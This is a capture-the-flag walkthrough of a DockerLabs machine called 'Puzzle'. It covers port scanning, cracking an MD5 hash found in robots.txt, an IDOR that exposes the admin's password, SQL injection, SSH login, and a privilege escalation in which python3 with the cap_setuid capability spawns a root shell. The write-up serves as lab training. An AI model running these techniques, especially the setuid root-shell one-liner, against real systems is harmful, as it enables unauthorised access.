![Screenshot](/medium/Puzzle/Images/machine.png)

Difficulty: **medium**

Made by: **Pyth0nK1d**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all we make sure the machine is up, we can do it with the command **ping**.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.235 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.133 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.134 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2033ms
rtt min/avg/max/mdev = 0.133/0.167/0.235/0.047 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

First we use **nmap** to scan what ports are open in the target.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-26 12:48 -05
Initiating ARP Ping Scan at 12:48
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:48, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:48
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:48, 2.67s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2025-12-26 12:48:40 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.04 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

When the scan concludes we can see that are 2 ports open:

- port 22 (ssh / Secure Shell)
- port 80 (http / Hyper-Text Transfer Protocol)

We can use once again **nmap** to know more about these ports like what services and versions are running on.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target
```

**-p22,80** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ open target.html
```

![Screenshot](/medium/Puzzle/Images/image1.png)

We can see that is more readable and pretty to the sight.

We can see that exists a website and also a **robots.txt** of some directories from the website.

Then let's take a look in the website with our browser.

![Screenshot](/medium/Puzzle/Images/image2.png)

The website shows that we need pieces to advance.

We see that exists a **robots** file on the website, so let's take a look.

---
# Enumeration

I personally use **curl** to see more clearly the file.

```python
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ curl -s http://172.17.0.2/robots.txt
# Nota: Hay que hablar con el administrador. Se están dando muchas pistas de recursos secretos en este archivo. Debe haber otra solución...

User-agent: *
Disallow: /zona-prohibida/
Disallow: /secretos-ancestrales/
Disallow: /tesoro-escondido/
Disallow: /laboratorio-experimentos/
Disallow: /plan-maestro/
Disallow: /archivos-confidenciales/
Disallow: /puerta-alternativa/

--------

# Oye paco, te dejo hasheada aquí tu contraseña, guardala bien para que no tengas que estar preguntando todo el rato.
# 25c09c85575db0e238c4ac35783cc43c


# Pieza 1: RW5ob3JhYnVlbmEhIEhhcyBjb21wbGV0YWRvIGVzdGUg
```

And we can see here 2 values a **hash** that seems is on **MD5** and a value in format base64 encoded.

But first let's decode the base64 value.

```rust
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ echo "RW5ob3JhYnVlbmEhIEhhcyBjb21wbGV0YWRvIGVzdGUg" | base64 -d
Enhorabuena! Has completado este
```

We got the 1st piece.

It seems the user **paco** has this password, so I'm going to try to find what are his password, I use **crackstation** before doing brute force with my own machine.

![Screenshot](/medium/Puzzle/Images/image3.png)

We can see that the password is: **rompecabezas**

So let's try to login with the user **paco** with this password.

![Screenshot](/medium/Puzzle/Images/image4.png)

We can see this **dashboard**, but we can't do anything here, it's just mere decoration.

So im going to take a look to my own profile if it have something interesting.

![Screenshot](/medium/Puzzle/Images/image5.png)

We can see something very interesting here, we can see that in the line of the url, we can see a parameter **?username=** and the user **paco** we can try to find if we can see another user just changing the value of this parameter, something like the user **admin**. 

---
# Exploitation

![Screenshot](/medium/Puzzle/Images/image6.png)

We successfully change the value, and we can see the content of the user **admin**.

This vulnerability is a **IDOR** in resume we can access another objects without valid sanitation or validation, in this case we can see the content from another user.

Okay, enough talk, we can see that the description of the user admin have his own password, so let's try to login with the user admin with this password.

![Screenshot](/medium/Puzzle/Images/image7.png)

We login as the user **admin**.

And we got a zone of admin and the 2nd piece.

```rust
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ echo "cHV6bGUgeSBwb3IgdGFudG8gc2UgdGUgb3RvcmdhbiBs" | base64 -d
puzle y por tanto se te otorgan l
```

We can see that it seems incomplete.

So let's try enter of this zone admin.

![Screenshot](/medium/Puzzle/Images/image8.png)

We can see that are a format that we need to insert a answer.

We have some interesting words that matter in this text, or more relevant than others:

- Consult
- Syntax
- Logic
- Interpretation

With this words we can assume that is something like **injection** or **sql injection**.

And the format need to be in english, only letters, without spaces.

So we can try to type these words and let's see if we have success.

![Screenshot](/medium/Puzzle/Images/image9.png)

And we got success! the correct word is: **sqlinjection**

We got the 3rd piece.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ echo "YXMgbGxhdmVzIGRlbCByZWlubzoKClB5dGgwbksxZDpV" | base64 -d
as llaves del reino:

Pyth0nK1d:U
```

Then let's try to organise these pieces with each other:

```
Enhorabuena! Has completado este puzle y por tanto se te otorgan las llaves del reino:

Pyth0nK1d:U
```

We need the last one.

In this page we can try to type a filter.

![Screenshot](/medium/Puzzle/Images/image10.png)

And with the answer of before, we can assume that we need to make a **SQLI**.

![Screenshot](/medium/Puzzle/Images/image11.png)

And it seems that is correct, this type of SQLI is error-based, sure it don't display the error message of the database, but I consider it when if we have a server error.

![Screenshot](/medium/Puzzle/Images/image12.png)

And we got the 4th piece now!

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ echo "QiNmY0VwSzI2ZzkrISMqQz85Y1dENjVoYnQjZUcKCg==" | base64 -d
B#fcEpK26g9+!#*C?9cWD65hbt#eG
```

And we got all of these pieces now, so we can organise them once again.

```
Enhorabuena! Has completado este puzle y por tanto se te otorgan las llaves del reino:

Pyth0nK1d:UB#fcEpK26g9+!#*C?9cWD65hbt#eG
```

We got credentials of a user and it seems also his password.

Then let's login with this credentials with ssh.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/medio/Puzzle/enumeration]
└─$ ssh Pyth0nK1d@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:0uBNpAet6NSzOmFPJLX3bWyj56xQZNiZxve4MuhaCTU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
Pyth0nK1d@172.17.0.2's password: 
Linux 8a9bd5efe9f8 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Pyth0nK1d@8a9bd5efe9f8:~$
```

And we are in!

---
# Privilege Escalation

Once inside we can try to find what ways we can escalate privileges, and with this system, we can do it with **capabilities**.

```
Pyth0nK1d@8a9bd5efe9f8:~$ getcap -r / 2>/dev/null
/usr/local/bin/python3 cap_setuid=ep
```

If you don't know what is a capability, in resume is basically the use of **SUIDs** but, is in a more controlled way, the use of capabilities can be used to give some permissions with privileges, you can take a look [here](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) to know more in detail.

```
Pyth0nK1d@8a9bd5efe9f8:~$ ls -l /usr/local/bin/python3
-rwxr-xr-x 1 root root 6831736 Dec 18 20:21 /usr/local/bin/python3
```

And we can see that the owner of this binary is the user **root**.

In this case the cap of cap_setuid is given in this binary of python3, so we can change the setuid to 0, if you remember the uid of the user **root** is equal to 0

So we need to execute commands to change the uid to 0 (**root**)

```r
Pyth0nK1d@8a9bd5efe9f8:~$ /usr/local/bin/python3 -c 'import os; os.setuid(0); os.system("bash")'
```

With this command we are changing the uid to 0, and executing a command **bash** as the user **root**, so in resume we are gaining a shell as the user **root**.

```
Pyth0nK1d@8a9bd5efe9f8:~$ /usr/local/bin/python3 -c 'import os; os.setuid(0); os.system("bash")'
root@8a9bd5efe9f8:~# whoami
root
root@8a9bd5efe9f8:~# cat /root/root.txt 
45f0088aed45a2407e50b6679842bfa2
```

We are root and we can read the **flag**! ***...pwned..!***
